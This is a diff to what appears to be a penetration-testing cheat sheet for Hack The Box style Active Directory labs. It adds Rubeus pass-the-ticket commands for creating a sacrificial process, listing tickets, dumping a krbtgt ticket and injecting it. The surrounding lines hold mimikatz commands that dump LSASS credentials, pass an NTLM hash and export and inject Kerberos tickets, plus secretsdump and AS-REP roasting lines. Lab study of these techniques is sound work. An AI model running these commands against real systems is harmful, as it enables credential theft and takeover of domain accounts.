@@ -612,6 +612,7 @@ cd /opt/mimikatz/x64
 .\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
 #PTT
+.\Rubeus.exe createnetonly /program:powershell.exe /show
 .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
 .\mimikatz.exe "privilege::debug" "kerberos::ptt c:\ticket\folder" "exit"
 
@@ -672,6 +673,15 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
 ## HTTP
 Enter-PSSession ws01.inlanefreight.local
 
+
+# PTT
+## Sacrificial Process 
+.\Rubeus.exe createnetonly /program:powershell.exe /show
+## Ticket list 
+.\Rubeus.exe triage
+## Ticket Extracting
+.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
+.\Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
 
 # AS-REP
 .\Rubeus.exe asreproast /nowrap /dc:
